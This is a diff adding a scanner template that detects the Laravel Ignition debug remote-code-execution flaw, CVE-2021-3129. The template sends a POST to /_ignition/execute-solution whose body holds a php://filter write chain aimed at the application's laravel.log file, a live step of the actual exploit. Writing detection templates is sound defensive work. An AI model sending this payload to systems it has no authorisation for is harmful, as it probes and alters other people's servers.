@@ -1,0 +1,16 @@
+name: Laravel Ignition Debug RCE (CVE-2021-3129)
+description: Detects the Laravel Ignition debug page vulnerable to remote code execution (CVE-2021-3129). When APP_DEBUG is true and Ignition is installed, attackers can trigger RCE via the /_ignition/execute-solution endpoint.
+severity: critical
+cwe: CWE-94
+
+requests:
+  - method: POST
+    path: /_ignition/execute-solution
+    headers:
+      Content-Type: application/json
+    body: "{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"x\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}}"
+
+matchers:
+  - body_contains: "runnable"
+  - body_contains: "Facade"
+  - status_code: 200
